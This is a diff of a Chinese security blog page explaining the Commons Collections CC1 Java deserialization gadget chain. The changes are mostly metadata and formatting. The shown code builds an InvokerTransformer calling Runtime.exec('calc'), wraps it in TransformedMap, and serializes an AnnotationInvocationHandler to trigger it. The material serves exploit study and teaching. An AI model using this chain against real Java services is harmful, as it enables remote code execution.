@@ -19,12 +19,12 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"curlysean.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="CC1链 前置基础 **Java反序列化原理：**  接受任意对象，执行readObject方法  若有一个A的readObject方法，调用了O1.method1方法，则我们可以修改这个O1 且在O1.method1方法中，调用了O2.method2方法，则我们可以修改这个O2 …… 最后调用了危险方法（Runtime.getRuntime.exec()）  最后调用危险方法有两种类型：  不同">
+    <meta name="description" content="CC1链 前置基础  Java反序列化原理： 接受任意对象，执行readObject方法  若有一个A的readObject方法，调用了O1.method1方法，则我们可以修改这个O1 且在O1.method1方法中，调用了O2.method2方法，则我们可以修改这个O2 …… 最后调用了危险方法（Runtime.getRuntime.exec()）  最后调用危险方法有两种类型：  不同类的同名">
 <meta property="og:type" content="article">
 <meta property="og:title" content="CC1链">
 <meta property="og:url" content="http://curlysean.github.io/2025/02/22/CC1%E9%93%BE/index.html">
 <meta property="og:site_name" content="肖恩的博客">
-<meta property="og:description" content="CC1链 前置基础 **Java反序列化原理：**  接受任意对象，执行readObject方法  若有一个A的readObject方法，调用了O1.method1方法，则我们可以修改这个O1 且在O1.method1方法中，调用了O2.method2方法，则我们可以修改这个O2 …… 最后调用了危险方法（Runtime.getRuntime.exec()）  最后调用危险方法有两种类型：  不同">
+<meta property="og:description" content="CC1链 前置基础  Java反序列化原理： 接受任意对象，执行readObject方法  若有一个A的readObject方法，调用了O1.method1方法，则我们可以修改这个O1 且在O1.method1方法中，调用了O2.method2方法，则我们可以修改这个O2 …… 最后调用了危险方法（Runtime.getRuntime.exec()）  最后调用危险方法有两种类型：  不同类的同名">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734592977931-4c3b2aaf-3f71-4f10-932e-7dc1662a4fba.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734804680861-66dd5a9f-af67-413b-8339-5029b5481a34.png">
@@ -35,7 +35,7 @@
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734611778517-78537c43-b8ae-4429-a561-a35934368e1b.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734613113591-5088ce99-b9a6-4f9f-b7e7-f9d975d2f339.png">
 <meta property="article:published_time" content="2025-02-22T13:38:56.978Z">
-<meta property="article:modified_time" content="2025-02-22T16:26:32.116Z">
+<meta property="article:modified_time" content="2025-03-24T04:06:01.155Z">
 <meta property="article:author" content="Sean">
 <meta property="article:tag" content="CC链">
 <meta name="twitter:card" content="summary">
@@ -153,6 +153,8 @@
 
         <div class="site-overview-wrap sidebar-panel">
           <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Sean"
+      src="/images/avatar.jpg">
   <p class="site-author-name" itemprop="name">Sean</p>
   <div class="site-description" itemprop="description"></div>
 </div>
@@ -160,7 +162,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-count">26</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -171,7 +173,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-count">8</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -201,7 +203,7 @@
     <link itemprop="mainEntityOfPage" href="http://curlysean.github.io/2025/02/22/CC1%E9%93%BE/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.jpg">
       <meta itemprop="name" content="Sean">
     </span>
 
@@ -234,7 +236,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2025-02-23 00:26:32" itemprop="dateModified" datetime="2025-02-23T00:26:32+08:00">2025-02-23</time>
+      <time title="修改时间：2025-03-24 12:06:01" itemprop="dateModified" datetime="2025-03-24T12:06:01+08:00">2025-03-24</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -264,8 +266,8 @@
     
     <div class="post-body" itemprop="articleBody"><h1 id="N9Uwl">CC1链</h1>
 <h2 id="mj2qI">前置基础</h2>
-**Java反序列化原理：**
 
+<p><strong>Java反序列化原理：</strong></p>
 <p>接受任意对象，执行readObject方法</p>
 <ol>
 <li>若有一个A的readObject方法，调用了O1.method1方法，则我们可以修改这个O1</li>
@@ -312,14 +314,14 @@ Transformer接口
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(rt);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
 <h3 id="M9rlJ">调用transform方法</h3>
-在`TransformedMap`中的`checkSetValue`方法调用了`valueTransformer`的`transform`方法
 
+<p>在<code>TransformedMap</code>中的<code>checkSetValue</code>方法调用了<code>valueTransformer</code>的<code>transform</code>方法</p>
 <p>这里的valueTransformer在构造函数中初始化，但由于构造函数为protected属性，我们找到了本类中的decorate方法可以去构造一个TransformedMap</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <h3 id="Svlmc">调用checkSetValue</h3>
-查找用法，只有`AbstractInputCheckedMapDecorator`中的内部类`MapEntry`的`setValue`可以调用`checkSetValue`方法（AbstractInputCheckedMapDecorator他是TransformedMap的父类）
 
+<p>查找用法，只有<code>AbstractInputCheckedMapDecorator</code>中的内部类<code>MapEntry</code>的<code>setValue</code>可以调用<code>checkSetValue</code>方法（AbstractInputCheckedMapDecorator他是TransformedMap的父类）</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">            value = parent.checkSetValue(value);</span><br><span class="line">            <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
 
 <p>通过遍历MapEntry，调用entry的<code>setValue</code>方法即可调用危险方法</p>
@@ -345,8 +347,8 @@ Transformer接口
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="comment">//        Class runtime = Runtime.class;</span></span><br><span class="line"><span class="comment">//        Method exec = runtime.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line"><span class="comment">//        exec.invoke(rt,&quot;calc&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;calc&quot;</span>, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        for (Map.Entry entry:transformedMap.entrySet()) &#123;</span></span><br><span class="line"><span class="comment">//            entry.setValue(rt);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> aClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> declaredConstructor.newInstance(Override.class, transformedMap);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
 <h2 id="IHp1B">最后调整</h2>
-**这条链子没有走下来有几个原因**
 
+<p><strong>这条链子没有走下来有几个原因</strong></p>
 <h3 id="AGS9S">一）Runtime类没有继承序列化接口</h3>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Runtime</span></span><br></pre></td></tr></table></figure>
 
@@ -438,7 +440,6 @@ Transformer接口
     </footer>
   </article>
 </div>
-
 
 
 
